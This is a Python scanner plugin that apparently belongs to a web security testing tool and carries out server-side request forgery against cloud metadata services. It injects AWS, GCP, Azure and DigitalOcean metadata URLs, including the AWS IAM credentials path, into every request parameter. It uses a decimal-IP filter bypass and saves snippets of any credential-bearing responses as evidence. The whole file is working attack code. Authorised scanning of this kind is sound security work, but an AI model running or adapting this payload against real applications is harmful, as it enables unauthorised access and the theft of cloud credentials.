from sdk.base_plugin import BasePlugin

class CloudMetadataPlugin(BasePlugin):
    """
    Advanced SSRF targeted at Cloud Provider Metadata services.
    """
    name = "Cloud Metadata SSRF"

    # Metadata targets for various clouds
    TARGETS = {
        "AWS": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "GCP": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "DigitalOcean": "http://169.254.169.254/metadata/v1.json"
    }

    # Headers required for some clouds (e.g. GCP/Azure)
    # This is often hard to inject via SSRF unless the app allows header control,
    # but we try basic URL injection first.
    
    def should_run(self, endpoint):
        return len(endpoint.params) > 0

    def detect(self, http, endpoint, payload_intel):


        findings = []
        try:
            base_params = {p['name']: p['value'] for p in endpoint.params}
        except: return

        for param in endpoint.params:
            for cloud, url in self.TARGETS.items():
                fuzzed = base_params.copy()
                fuzzed[param['name']] = url
                
                try:
                    # Some SSRF bypasses
                    payloads = [url, url.replace("169.254.169.254", "2852039166")] # Decimal IP bypass
                    
                    for p in payloads:
                        fuzzed[param['name']] = p
                        resp = self._make_request(http, endpoint, fuzzed)
                        if not resp: continue
                        
                        # Detection
                        if any(x in resp.text for x in ["instance-id", "projectId", "computeMetadata", "AccessKeyId"]):
                             snippet = resp.text[:100].replace('\n', ' ').strip()
                             findings.append({'plugin': self.name, 'endpoint': endpoint.url, 'parameter': param['name'], 'payload': p, 'evidence': f"Confirmed {cloud} Metadata Exposure. Data: {snippet}...", 'confidence': "CRITICAL"})
                            
                except: continue
        return findings

    def _make_request(self, http, endpoint, params):
        if endpoint.method == "POST":
            return http.request("POST", endpoint.url, data=params)
        return http.request("GET", endpoint.url, params=params)
